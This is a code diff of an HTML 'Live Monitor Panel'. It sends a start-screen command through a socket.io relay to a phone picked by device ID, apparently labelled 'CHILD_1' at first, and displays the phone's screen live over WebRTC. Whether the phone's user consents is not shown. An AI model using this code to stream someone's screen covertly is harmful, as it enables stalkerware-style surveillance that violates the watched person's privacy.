@@ -1,53 +1,174 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Fresh Start Monitor</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Screen Monitor</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
-    <style> video { width: 300px; border: 2px solid red; } </style>
+    <style>
+        body {
+            background-color: #121212;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+        }
+
+        h1 { margin-bottom: 10px; color: #00e676; }
+
+        .control-panel {
+            background: #1e1e1e;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        input {
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #333;
+            background: #2c2c2c;
+            color: white;
+            font-size: 16px;
+            width: 150px;
+        }
+
+        button {
+            padding: 10px 20px;
+            border-radius: 5px;
+            border: none;
+            background: #2979ff;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.2s;
+        }
+
+        button:hover { background: #2962ff; }
+        button:active { transform: scale(0.98); }
+
+        .video-container {
+            width: 100%;
+            max-width: 400px; /* Phone screen size mock */
+            aspect-ratio: 9/16;
+            background: #000;
+            border: 4px solid #333;
+            border-radius: 15px;
+            overflow: hidden;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0, 230, 118, 0.2);
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain; /* Pura screen dikhega */
+        }
+
+        .status {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #888;
+        }
+
+        .status.connected { color: #00e676; }
+        .status.disconnected { color: #ff1744; }
+
+        #loadingText {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #555;
+            font-size: 18px;
+            pointer-events: none;
+        }
+    </style>
 </head>
 <body>
-    <h2>Screen Monitor (Clean Test)</h2>
-    <button onclick="startScreen()">START SCREEN (CHILD_1)</button>
-    <br><br>
-    <video id="remoteVideo" autoplay playsinline></video>
+
+    <h1>🕵️‍♂️ Live Monitor Panel</h1>
+
+    <div class="control-panel">
+        <input type="text" id="deviceId" value="278964" placeholder="Enter Device ID">
+        <button onclick="startScreen()">▶ Start Stream</button>
+    </div>
+
+    <div class="status" id="connectionStatus">🔴 Disconnected</div>
+
+    <div class="video-container">
+        <div id="loadingText">Waiting for stream...</div>
+        <video id="remoteVideo" autoplay playsinline controls></video>
+    </div>
 
     <script>
         const socket = io("https://child-v9no.onrender.com");
         let pc;
-        const TARGET_DEVICE = "CHILD_1"; // 🔥 Must match Android Code
+        const statusLabel = document.getElementById("connectionStatus");
+        const loadingText = document.getElementById("loadingText");
 
         socket.on("connect", () => {
-            console.log("Connected as ADMIN");
+            console.log("✅ Connected to Server as ADMIN");
+            statusLabel.innerText = "🟢 Server Connected (Waiting for Target)";
+            statusLabel.classList.add("connected");
+            statusLabel.classList.remove("disconnected");
+            
+            // Admin room join kar raha hai
             socket.emit("join-room", "ADMIN");
         });
 
-        // 1. Button dabane par command bhejo
+        socket.on("disconnect", () => {
+            statusLabel.innerText = "🔴 Disconnected from Server";
+            statusLabel.classList.add("disconnected");
+            statusLabel.classList.remove("connected");
+        });
+
+        function getTargetRoom() {
+            const id = document.getElementById("deviceId").value;
+            return id + "_screen"; // E.g., 278964_screen
+        }
+
+        // 1. Start Button Logic
         function startScreen() {
-            // Hum command bhej rahe hain "CHILD_1_screen" room mein
-            const targetRoom = TARGET_DEVICE + "_screen";
-            console.log("Sending command to:", targetRoom);
+            const roomName = getTargetRoom();
+            console.log("🚀 Sending START command to:", roomName);
+            statusLabel.innerText = "⏳ Requesting Screen Share...";
             
             socket.emit("send-command", {
-                targetId: targetRoom, 
+                targetId: roomName, 
                 command: "start_screen"
             });
         }
 
-        // 2. Offer receive karo
+        // 2. Offer Receive & Auto-Answer Logic
         socket.on("offer", async (data) => {
-            console.log("Offer Received!");
+            console.log("📡 Offer Received! Processing...");
+            statusLabel.innerText = "⚡ Connecting to Device...";
+            loadingText.style.display = "none"; // Hide text
+
             pc = new RTCPeerConnection({
                 iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
             });
 
             pc.ontrack = (event) => {
-                document.getElementById("remoteVideo").srcObject = event.streams[0];
+                console.log("🎬 Video Stream Track Received");
+                const video = document.getElementById("remoteVideo");
+                video.srcObject = event.streams[0];
+                statusLabel.innerText = "✅ Live Stream Active";
             };
 
             pc.onicecandidate = (event) => {
                 if (event.candidate) {
                     socket.emit("candidate", {
-                        target: TARGET_DEVICE + "_screen",
+                        target: getTargetRoom(),
                         candidate: event.candidate.candidate,
                         sdpMid: event.candidate.sdpMid,
                         sdpMLineIndex: event.candidate.sdpMLineIndex
@@ -55,25 +176,32 @@
                 }
             };
 
-            await pc.setRemoteDescription({ type: "offer", sdp: data.sdp });
+            // Set Remote Description (Offer from Mobile)
+            await pc.setRemoteDescription(new RTCSessionDescription({ type: "offer", sdp: data.sdp }));
+
+            // Create Answer
             const answer = await pc.createAnswer();
             await pc.setLocalDescription(answer);
 
+            console.log("📤 Sending ANSWER back to mobile...");
+            
+            // 🔥 YAHAN ANSWER BHEJA JA RAHA HAI
             socket.emit("answer", {
-                target: TARGET_DEVICE + "_screen",
+                target: getTargetRoom(),
                 sdp: answer.sdp
             });
         });
 
         socket.on("candidate", (data) => {
             if (pc) {
-                pc.addIceCandidate({
+                pc.addIceCandidate(new RTCIceCandidate({
                     candidate: data.candidate,
                     sdpMid: data.sdpMid,
                     sdpMLineIndex: data.sdpMLineIndex
-                });
+                }));
             }
         });
+
     </script>
 </body>
 </html>
